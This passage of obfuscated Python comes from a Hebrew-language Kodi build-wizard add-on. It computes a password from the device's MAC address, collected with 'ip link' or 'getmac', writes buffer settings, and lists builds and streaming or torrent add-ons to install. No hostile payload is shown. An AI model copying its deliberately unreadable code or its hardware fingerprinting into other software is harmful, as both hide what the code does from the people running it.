    OOO000OOO00OOO000 =(str (round (sqrt ((O0000OO00000O00O0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1622
    if '.'in OOO000OOO00OOO000 :#line:1623
     OOO000OOO00OOO000 =(str (round (sqrt ((O0000OO00000O00O0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1624
    if O000OOO00O0OOOOOO ==OOO000OOO00OOO000 :#line:1626
      OOO0O0O00O00OOOO0 =OO00000O00OOO000O #line:1628
    else :#line:1630
       if STARTP2 ()and STARTP ()=='ok':#line:1631
         return OO00000O00OOO000O #line:1634
       OOO0O0O00O00OOOO0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1635
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1636
       sys .exit ()#line:1637
    return OOO0O0O00O00OOOO0 #line:1638
def disply_hwr ():#line:1641
   try :#line:1642
    OOO00OOOO0O0O0O0O =tmdb_list (TMDB_NEW_API )#line:1643
    O000O000O0000O000 =str ((getHwAddr ('eth0'))*OOO00OOOO0O0O0O0O )#line:1644
    OO00OOOOOOO00OO00 =(O000O000O0000O000 [1 ]+O000O000O0000O000 [2 ]+O000O000O0000O000 [5 ]+O000O000O0000O000 [7 ])#line:1651
    OOO000O00O0O0O00O =(ADDON .getSetting ("action"))#line:1652
    wiz .setS ('action',str (OO00OOOOOOO00OO00 ))#line:1654
   except :pass #line:1655
def disply_hwr2 ():#line:1656
   try :#line:1657
    OO0OOO0OO000O0OO0 =tmdb_list (TMDB_NEW_API )#line:1658
    O0OO0O0000OOOO0O0 =str ((getHwAddr ('eth0'))*OO0OOO0OO000O0OO0 )#line:1660
    OO0OOOOO00O0O0O0O =(O0OO0O0000OOOO0O0 [1 ]+O0OO0O0000OOOO0O0 [2 ]+O0OO0O0000OOOO0O0 [5 ]+O0OO0O0000OOOO0O0 [7 ])#line:1669
    OOOOOO0O0O00O0O00 =(ADDON .getSetting ("action"))#line:1670
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OO0OOOOO00O0O0O0O )#line:1673
   except :pass #line:1674
def getHwAddr (O0OOOO0O0OOO0OO00 ):#line:1676
   import subprocess ,time #line:1677
   OO0O0O0O0O0OO0000 ='windows'#line:1678
   if xbmc .getCondVisibility ('system.platform.android'):#line:1679
       OO0O0O0O0O0OO0000 ='android'#line:1680
   if xbmc .getCondVisibility ('system.platform.android'):#line:1681
     O0OOOO0OO00OO0O00 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1682
     OO000O0OOOO0OO00O =re .compile ('link/ether (.+?) brd').findall (str (O0OOOO0OO00OO0O00 ))#line:1684
     O000O0OOO0OO0OOOO =0 #line:1685
     for O00O000O0O00O00O0 in OO000O0OOOO0OO00O :#line:1686
      if OO000O0OOOO0OO00O !='00:00:00:00:00:00':#line:1687
          OOO0O00O00O00O000 =O00O000O0O00O00O0 #line:1688
          O000O0OOO0OO0OOOO =O000O0OOO0OO0OOOO +int (OOO0O00O00O00O000 .replace (':',''),16 )#line:1689
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1691
       OOOOO0O00OO0000O0 =0 #line:1692
       O000O0OOO0OO0OOOO =0 #line:1693
       O0O0OO00O0000O0O0 =[]#line:1694
       OOO0OO0OOOO0O0OO0 =os .popen ("getmac").read ()#line:1695
       OOO0OO0OOOO0O0OO0 =OOO0OO0OOOO0O0OO0 .split ("\n")#line:1696
       for O00000O00OOO0000O in OOO0OO0OOOO0O0OO0 :#line:1698
            O00O00OO000OO00O0 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O00000O00OOO0000O ,re .I )#line:1699
            if O00O00OO000OO00O0 :#line:1700
                OO000O0OOOO0OO00O =O00O00OO000OO00O0 .group ().replace ('-',':')#line:1701
                O0O0OO00O0000O0O0 .append (OO000O0OOOO0OO00O )#line:1702
                O000O0OOO0OO0OOOO =O000O0OOO0OO0OOOO +int (OO000O0OOOO0OO00O .replace (':',''),16 )#line:1705
   else :#line:1707
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1708
   try :#line:1725
    return O000O0OOO0OO0OOOO #line:1726
   except :pass #line:1727
def getpass ():#line:1728
	disply_hwr2 ()#line:1730
def setpass ():#line:1731
    OOO0O0OO00000OOO0 =xbmcgui .Dialog ()#line:1732
    OOOO0OO00OO0000O0 =''#line:1733
    O0OOOO00O0O000O00 =xbmc .Keyboard (OOOO0OO00OO0000O0 ,'הכנס סיסמה')#line:1735
    O0OOOO00O0O000O00 .doModal ()#line:1736
    if O0OOOO00O0O000O00 .isConfirmed ():#line:1737
           O0OOOO00O0O000O00 =O0OOOO00O0O000O00 .getText ()#line:1738
    wiz .setS ('pass',str (O0OOOO00O0O000O00 ))#line:1739
def setuname ():#line:1740
    O00OO0O000O00O0O0 =''#line:1741
    OO00OO0O0000O00OO =xbmc .Keyboard (O00OO0O000O00O0O0 ,'הכנס שם משתמש')#line:1742
    OO00OO0O0000O00OO .doModal ()#line:1743
    if OO00OO0O0000O00OO .isConfirmed ():#line:1744
           O00OO0O000O00O0O0 =OO00OO0O0000O00OO .getText ()#line:1745
           wiz .setS ('user',str (O00OO0O000O00O0O0 ))#line:1746
def powerkodi ():#line:1747
    os ._exit (1 )#line:1748
def buffer1 ():#line:1750
	O00OOO0O00O00OO00 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1751
	OO0000O00000O0OO0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1752
	OO0OOO00O00O00O0O =xbmc .getInfoLabel ("System.FreeMemory")#line:1753
	O00OO000OO00OO0O0 =re .sub ('[^0-9]','',OO0OOO00O00O00O0O )#line:1754
	O00OO000OO00OO0O0 =int (O00OO000OO00OO0O0 )/3 #line:1755
	OO000O00OOO000OOO =O00OO000OO00OO0O0 *1024 *1024 #line:1756
	try :O0O00OO0OOO00OO0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1757
	except :O0O00OO0OOO00OO0O =16 #line:1758
	O0O0O0OO000000000 =DIALOG .yesno ('FREE MEMORY: '+str (OO0OOO00O00O00O0O ),'Based on your free Memory your optimal buffersize is: '+str (O00OO000OO00OO0O0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1761
	if O0O0O0OO000000000 ==1 :#line:1762
		with open (O00OOO0O00O00OO00 ,"w")as OOOOOOOOOOO0OO000 :#line:1763
			if O0O00OO0OOO00OO0O >=17 :OOOOO0O0OO0OO000O =xml_data_advSettings_New (str (OO000O00OOO000OOO ))#line:1764
			else :OOOOO0O0OO0OO000O =xml_data_advSettings_old (str (OO000O00OOO000OOO ))#line:1765
			OOOOOOOOOOO0OO000 .write (OOOOO0O0OO0OO000O )#line:1767
			DIALOG .ok ('Buffer Size Set to: '+str (OO000O00OOO000OOO ),'Please restart Kodi for settings to apply.','')#line:1768
	elif O0O0O0OO000000000 ==0 :#line:1770
		OO000O00OOO000OOO =_O00OO00O0OOO0OOOO (default =str (OO000O00OOO000OOO ),heading ="INPUT BUFFER SIZE")#line:1771
		with open (O00OOO0O00O00OO00 ,"w")as OOOOOOOOOOO0OO000 :#line:1772
			if O0O00OO0OOO00OO0O >=17 :OOOOO0O0OO0OO000O =xml_data_advSettings_New (str (OO000O00OOO000OOO ))#line:1773
			else :OOOOO0O0OO0OO000O =xml_data_advSettings_old (str (OO000O00OOO000OOO ))#line:1774
			OOOOOOOOOOO0OO000 .write (OOOOO0O0OO0OO000O )#line:1775
			DIALOG .ok ('Buffer Size Set to: '+str (OO000O00OOO000OOO ),'Please restart Kodi for settings to apply.','')#line:1776
def xml_data_advSettings_old (O000O0O000000O0OO ):#line:1777
	OO0OO0O00O0O00O00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O000O0O000000O0OO #line:1787
	return OO0OO0O00O0O00O00 #line:1788
def xml_data_advSettings_New (OO0O0OO0OO0OO00OO ):#line:1790
	O000OO00OOO0OO0O0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO0O0OO0OO0OO00OO #line:1802
	return O000OO00OOO0OO0O0 #line:1803
def write_ADV_SETTINGS_XML (O0O0O0O0OOO0O0OOO ):#line:1804
    if not os .path .exists (xml_file ):#line:1805
        with open (xml_file ,"w")as O00O0OOOO000OOO00 :#line:1806
            O00O0OOOO000OOO00 .write (xml_data )#line:1807
def _O00OO00O0OOO0OOOO (default ="",heading ="",hidden =False ):#line:1808
    ""#line:1809
    OO0OO0OO000OOO00O =xbmc .Keyboard (default ,heading ,hidden )#line:1810
    OO0OO0OO000OOO00O .doModal ()#line:1811
    if (OO0OO0OO000OOO00O .isConfirmed ()):#line:1812
        return unicode (OO0OO0OO000OOO00O .getText (),"utf-8")#line:1813
    return default #line:1814
def index ():#line:1816
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1817
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1818
	if AUTOUPDATE =='Yes':#line:1819
		if wiz .workingURL (WIZARDFILE )==True :#line:1820
			OO000O0OO0OO000OO =wiz .checkWizard ('version')#line:1821
			if OO000O0OO0OO000OO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO000O0OO0OO000OO ),'wizardupdate',themeit =THEME2 )#line:1822
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1823
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1824
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1825
	if len (BUILDNAME )>0 :#line:1826
		OO0OOO00OOO0O0O00 =wiz .checkBuild (BUILDNAME ,'version')#line:1827
		O00O00O0000O0O0O0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1828
		if OO0OOO00OOO0O0O00 >BUILDVERSION :O00O00O0000O0O0O0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O00O00O0000O0O0O0 ,OO0OOO00OOO0O0O00 )#line:1829
		addDir (O00O00O0000O0O0O0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1831
		try :#line:1833
		     O0O0O00OO00OO0OOO =wiz .themeCount (BUILDNAME )#line:1834
		except :#line:1835
		   O0O0O00OO00OO0OOO =False #line:1836
		if not O0O0O00OO00OO0OOO ==False :#line:1837
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1838
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1839
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1842
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1843
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1844
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1848
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1850
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1852
def morsetup ():#line:1854
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1855
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1856
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1857
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1858
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1862
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1863
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1866
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1867
	addDir ('הגדרת חשבון RD','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:1873
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1877
	setView ('files','viewType')#line:1878
def morsetup2 ():#line:1879
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1880
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1881
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1882
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1883
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1884
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1885
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1886
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1887
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1888
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1889
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1890
def fastupdate ():#line:1891
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1892
def forcefastupdate ():#line:1894
			OO00000OO00OOOO0O ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1895
			wiz .ForceFastUpDate (ADDONTITLE ,OO00000OO00OOOO0O )#line:1896
def rdsetup ():#line:1900
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:1901
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:1902
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1904
def traktsetup ():#line:1906
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1907
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1908
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1909
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1910
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1911
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1912
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1913
	setView ('files','viewType')#line:1914
def setautorealdebrid ():#line:1915
    from resources .libs import real_debrid #line:1916
    OO000OOO000O0O0O0 =real_debrid .RealDebridFirst ()#line:1917
    OO000OOO000O0O0O0 .auth ()#line:1918
def setrealdebrid ():#line:1920
    from resources .libs import real_debrid #line:1921
    O0OO0O00OOO00OO00 =real_debrid .RealDebrid ()#line:1922
    O0OO0O00OOO00OO00 .auth ()#line:1923
    O0OO0O00OOO00OO00 =real_debrid .RealDebrid ()#line:1924
    O00000OO00OO0O0O0 =(O0OO0O00OOO00OO00 .getRelevantHosters ())#line:1925
    rdon ()#line:1926
def resolveurlsetup ():#line:1928
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1929
def urlresolversetup ():#line:1930
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1931
def placentasetup ():#line:1933
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1934
def reptiliasetup ():#line:1935
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1936
def flixnetsetup ():#line:1937
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1938
def yodasetup ():#line:1939
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1940
def numberssetup ():#line:1941
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1942
def uranussetup ():#line:1943
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1944
def genesissetup ():#line:1945
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1946
def net_tools (view =None ):#line:1948
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1949
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1950
	setView ('files','viewType')#line:1952
def speedMenu ():#line:1953
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1954
def viewIP ():#line:1955
	O0OO0OO00O00000OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1969
	O00000OO0OOO00000 =[];OOO00O0O0OOOO00OO =0 #line:1970
	for O00O0OOO00OOOO000 in O0OO0OO00O00000OO :#line:1971
		O0O00OO000OO0OOOO =wiz .getInfo (O00O0OOO00OOOO000 )#line:1972
		O0OO0OO0000O0000O =0 #line:1973
		while O0O00OO000OO0OOOO =="Busy"and O0OO0OO0000O0000O <10 :#line:1974
			O0O00OO000OO0OOOO =wiz .getInfo (O00O0OOO00OOOO000 );O0OO0OO0000O0000O +=1 ;wiz .log ("%s sleep %s"%(O00O0OOO00OOOO000 ,str (O0OO0OO0000O0000O )));xbmc .sleep (1000 )#line:1975
		O00000OO0OOO00000 .append (O0O00OO000OO0OOOO )#line:1976
		OOO00O0O0OOOO00OO +=1 #line:1977
	OO0O00OO00O0OO00O ,O000OOOO000OO0O00 ,O0OO0OOOOO0OOOO0O =getIP ()#line:1978
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000OO0OOO00000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1979
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00OO00O0OO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1980
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO000OO0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1981
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0OOOOO0OOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1982
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000OO0OOO00000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1983
	setView ('files','viewType')#line:1984
def buildMenu ():#line:1986
	if USERNAME =='':#line:1987
		ADDON .openSettings ()#line:1988
		sys .exit ()#line:1989
	if PASSWORD =='':#line:1990
		ADDON .openSettings ()#line:1991
	O0000O0OO00O0OO0O =u_list (SPEEDFILE )#line:1992
	(O0000O0OO00O0OO0O )#line:1993
	OOO0O0000OOO00OOO =(wiz .workingURL (O0000O0OO00O0OO0O ))#line:1994
	(OOO0O0000OOO00OOO )#line:1995
	OOO0O0000OOO00OOO =wiz .workingURL (SPEEDFILE )#line:1996
	if not OOO0O0000OOO00OOO ==True :#line:1997
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1998
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1999
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2000
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2001
		addFile ('%s'%OOO0O0000OOO00OOO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2002
	else :#line:2003
		O0O0OO0OO00O000O0 ,OOOOOOO00O00OO0OO ,OO00000O00000OOO0 ,O00O000OO0O0000OO ,OOOOOOOO00O0O0O00 ,OO0OO0O00000OO0OO ,O0OOOO0OO0OO0O00O =wiz .buildCount ()#line:2004
		O0O000OOO0O0O00OO =False ;O0000OOO000O00OOO =[]#line:2005
		if THIRDPARTY =='true':#line:2006
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O000OOO0O0O00OO =True ;O0000OOO000O00OOO .append ('1')#line:2007
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O000OOO0O0O00OO =True ;O0000OOO000O00OOO .append ('2')#line:2008
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O000OOO0O0O00OO =True ;O0000OOO000O00OOO .append ('3')#line:2009
		OOO0O0OO00O00000O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2010
		O00OO00OOO00OO000 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0O0OO00O00000O )#line:2011
		if O0O0OO0OO00O000O0 ==1 and O0O000OOO0O0O00OO ==False :#line:2012
			for O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ,OOO000OOO0000O0O0 ,OO0O0OOO000OO0000 ,OO00OO0OO00000OO0 ,OO0000O0O0OO00OOO ,OO0OO00OO000OO0O0 ,OOO0O00OOOOO0O0OO ,OO0O0OO0OO0OOOO0O ,OO0000O00OOO00000 in O00OO00OOO00OO000 :#line:2013
				if not SHOWADULT =='true'and OO0O0OO0OO0OOOO0O .lower ()=='yes':continue #line:2014
				if not DEVELOPER =='true'and wiz .strTest (O00OO0O000O0OO0O0 ):continue #line:2015
				viewBuild (O00OO00OOO00OO000 [0 ][0 ])#line:2016
				return #line:2017
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2020
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2021
		if O0O000OOO0O0O00OO ==True :#line:2022
			for OOO0O000000O00000 in O0000OOO000O00OOO :#line:2023
				O00OO0O000O0OO0O0 =eval ('THIRD%sNAME'%OOO0O000000O00000 )#line:2024
		if len (O00OO00OOO00OO000 )>=1 :#line:2026
			if SEPERATE =='true':#line:2027
				for O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ,OOO000OOO0000O0O0 ,OO0O0OOO000OO0000 ,OO00OO0OO00000OO0 ,OO0000O0O0OO00OOO ,OO0OO00OO000OO0O0 ,OOO0O00OOOOO0O0OO ,OO0O0OO0OO0OOOO0O ,OO0000O00OOO00000 in O00OO00OOO00OO000 :#line:2028
					if not SHOWADULT =='true'and OO0O0OO0OO0OOOO0O .lower ()=='yes':continue #line:2029
					if not DEVELOPER =='true'and wiz .strTest (O00OO0O000O0OO0O0 ):continue #line:2030
					O0O0O00O0OOOOOO0O =createMenu ('install','',O00OO0O000O0OO0O0 )#line:2031
					addDir ('[%s] %s (v%s)'%(float (OO00OO0OO00000OO0 ),O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ),'viewbuild',O00OO0O000O0OO0O0 ,description =OO0000O00OOO00000 ,fanart =OOO0O00OOOOO0O0OO ,icon =OO0OO00OO000OO0O0 ,menu =O0O0O00O0OOOOOO0O ,themeit =THEME2 )#line:2032
			else :#line:2033
				if O00O000OO0O0000OO >0 :#line:2034
					OOO00OOO0OOO0OO0O ='+'if SHOW17 =='false'else '-'#line:2035
					if SHOW17 =='true':#line:2037
						for O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ,OOO000OOO0000O0O0 ,OO0O0OOO000OO0000 ,OO00OO0OO00000OO0 ,OO0000O0O0OO00OOO ,OO0OO00OO000OO0O0 ,OOO0O00OOOOO0O0OO ,OO0O0OO0OO0OOOO0O ,OO0000O00OOO00000 in O00OO00OOO00OO000 :#line:2039
							if not SHOWADULT =='true'and OO0O0OO0OO0OOOO0O .lower ()=='yes':continue #line:2040
							if not DEVELOPER =='true'and wiz .strTest (O00OO0O000O0OO0O0 ):continue #line:2041
							O000O00OOOO000O0O =int (float (OO00OO0OO00000OO0 ))#line:2042
							if O000O00OOOO000O0O ==17 :#line:2043
								O0O0O00O0OOOOOO0O =createMenu ('install','',O00OO0O000O0OO0O0 )#line:2044
								addDir ('[%s] %s (v%s)'%(float (OO00OO0OO00000OO0 ),O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ),'viewbuild',O00OO0O000O0OO0O0 ,description =OO0000O00OOO00000 ,fanart =OOO0O00OOOOO0O0OO ,icon =OO0OO00OO000OO0O0 ,menu =O0O0O00O0OOOOOO0O ,themeit =THEME2 )#line:2045
				if OOOOOOOO00O0O0O00 >0 :#line:2046
					OOO00OOO0OOO0OO0O ='+'if SHOW18 =='false'else '-'#line:2047
					if SHOW18 =='true':#line:2049
						for O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ,OOO000OOO0000O0O0 ,OO0O0OOO000OO0000 ,OO00OO0OO00000OO0 ,OO0000O0O0OO00OOO ,OO0OO00OO000OO0O0 ,OOO0O00OOOOO0O0OO ,OO0O0OO0OO0OOOO0O ,OO0000O00OOO00000 in O00OO00OOO00OO000 :#line:2051
							if not SHOWADULT =='true'and OO0O0OO0OO0OOOO0O .lower ()=='yes':continue #line:2052
							if not DEVELOPER =='true'and wiz .strTest (O00OO0O000O0OO0O0 ):continue #line:2053
							O000O00OOOO000O0O =int (float (OO00OO0OO00000OO0 ))#line:2054
							if O000O00OOOO000O0O ==18 :#line:2055
								O0O0O00O0OOOOOO0O =createMenu ('install','',O00OO0O000O0OO0O0 )#line:2056
								addDir ('[%s] %s (v%s)'%(float (OO00OO0OO00000OO0 ),O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ),'viewbuild',O00OO0O000O0OO0O0 ,description =OO0000O00OOO00000 ,fanart =OOO0O00OOOOO0O0OO ,icon =OO0OO00OO000OO0O0 ,menu =O0O0O00O0OOOOOO0O ,themeit =THEME2 )#line:2057
				if OO00000O00000OOO0 >0 :#line:2058
					OOO00OOO0OOO0OO0O ='+'if SHOW16 =='false'else '-'#line:2059
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOO00OOO0OOO0OO0O ,OO00000O00000OOO0 ),'togglesetting','show16',themeit =THEME3 )#line:2060
					if SHOW16 =='true':#line:2061
						for O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ,OOO000OOO0000O0O0 ,OO0O0OOO000OO0000 ,OO00OO0OO00000OO0 ,OO0000O0O0OO00OOO ,OO0OO00OO000OO0O0 ,OOO0O00OOOOO0O0OO ,OO0O0OO0OO0OOOO0O ,OO0000O00OOO00000 in O00OO00OOO00OO000 :#line:2062
							if not SHOWADULT =='true'and OO0O0OO0OO0OOOO0O .lower ()=='yes':continue #line:2063
							if not DEVELOPER =='true'and wiz .strTest (O00OO0O000O0OO0O0 ):continue #line:2064
							O000O00OOOO000O0O =int (float (OO00OO0OO00000OO0 ))#line:2065
							if O000O00OOOO000O0O ==16 :#line:2066
								O0O0O00O0OOOOOO0O =createMenu ('install','',O00OO0O000O0OO0O0 )#line:2067
